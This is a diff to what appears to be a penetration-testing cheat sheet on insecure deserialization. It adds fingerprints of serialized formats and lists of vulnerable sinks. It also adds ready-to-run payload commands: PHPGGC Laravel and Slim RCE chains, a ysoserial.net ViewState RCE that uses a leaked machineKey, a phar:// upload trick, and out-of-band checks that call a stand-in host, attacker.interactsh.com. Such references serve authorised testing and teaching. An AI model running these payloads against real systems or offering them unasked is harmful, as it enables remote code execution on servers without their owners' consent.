@@ -2,14 +2,29 @@
 
 > Insecure deserialization — when untrusted data is used to reconstruct objects, allowing attackers to trigger arbitrary code execution via gadget chains.
 
+## Format fingerprinting
+
+| Prefix / pattern | Format |
+|---|---|
+| `rO0` | Java `ObjectInputStream` (base64 of `AC ED 00 05`) |
+| `\xac\xed` | Java raw |
+| `a:`, `O:`, `s:` | PHP `serialize()` |
+| `gASV` | Python pickle (base64) |
+| `\x80\x04` | Python pickle protocol 4 raw |
+| `TzoxNjoi` | Base64 of PHP `O:16:"...` |
+| `AAEAAAD/////` | .NET `BinaryFormatter` |
+| `{"$type":"..."}` | .NET Json.NET with TypeNameHandling |
+
+Check cookies, hidden fields, API bodies, cache entries, session blobs, message queues.
+
 ## Surface
 
-- Java: `ObjectInputStream.readObject()` — cookies, JMX, RMI, custom protocols
+- Java: `ObjectInputStream.readObject()` — cookies, JMX, RMI, custom protocols; high-value sinks: RMI, JMX, LDAP (JNDI), Spring actuator `/jolokia`, Log4Shell-era JNDI injection
 - PHP: `unserialize()` — session data, cookies, API params
 - .NET: `BinaryFormatter`, `XmlSerializer`, `DataContractSerializer` — SOAP, ViewState
-- Python: `pickle.loads()` — ML model endpoints, job queues, session stores
+- Python: `pickle.loads()` — ML model endpoints, job queues, session stores; also: `yaml.load`, `jsonpickle`, `marshal`, `shelve`
 - Ruby: `Marshal.load()` — Rails session cookies (pre-5.2), Sidekiq job args
-- Node.js: `node-serialize`, `funcster`, `serialize-javascript` — JSON-adjacent
+- Node.js: `node-serialize`, `funcster`, `serialize-javascript`, `serialize-to-js` — JSON-adjacent
 - YAML: `yaml.load()` (PyYAML pre-5.1), SnakeYAML — anywhere YAML is parsed
 
 ## Test Approach
@@ -56,10 +71,51 @@
    java -jar ysoserial.jar URLDNS "http://attacker.interactsh.com" | base64 -w 0
    ```
 
+## PHP Phar deserialization
+
+Any PHP filesystem function called on a `phar://` URI triggers unserialize of phar metadata. Upload a valid image containing phar metadata, then reference it via `phar://`:
+
+```
+phar://upload/file.jpg/exploit
+```
+
+Common gadget chains (PHPGGC): Laravel, Symfony, Drupal, Guzzle, Monolog, Slim.
+
+```bash
+phpggc Laravel/RCE9 system 'id' -u -b
+```
+
+## .NET machineKey / ViewState
+
+Leaked `machineKey` = full RCE on ASP.NET. Generate payload:
+
+```bash
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
+  --path="/" --apppath="/" --validationalg="SHA1" --validationkey="<machineKey>"
+```
+
+`ObjectStateFormatter` (ViewState), `LosFormatter`, `SoapFormatter`, `Json.NET` with `TypeNameHandling=Auto/All` are all sinks.
+
+## Detection without RCE (OOB)
+
+Use DNS callback gadgets to confirm deserialization without needing a working chain:
+
+```bash
+# Java URLDNS gadget — triggers DNS lookup, no classpath dependency
+java -jar ysoserial.jar URLDNS "http://attacker.interactsh.com" | base64 -w 0
+
+# .NET TypeConfuseDelegate ping
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping attacker.interactsh.com"
+
+# PHP PHPGGC with sleep sink
+phpggc -b Slim/RCE1 system 'sleep 5'
+```
+
 ## Tools
 
-- **ysoserial** — Java gadget chains: CommonsCollections1-7, Spring, Hibernate, etc.
-- **ysoserial.net** — .NET BinaryFormatter/ViewState gadget chains
+- **ysoserial** — Java gadget chains: CommonsCollections1-11, Spring, Hibernate, ROME, JSON-lib
+- **ysoserial.net** — .NET BinaryFormatter/ViewState gadget chains (pwntester)
+- **marshalsec** — beyond native: Jackson, SnakeYAML, XStream, BlazeDS, Kryo
 - **PHPGGC** — PHP gadget chain generator: `phpggc -l` lists available chains
 - **Interactsh** — OOB DNS/HTTP for blind deserialization detection
 - **nuclei** — deserialization detection templates
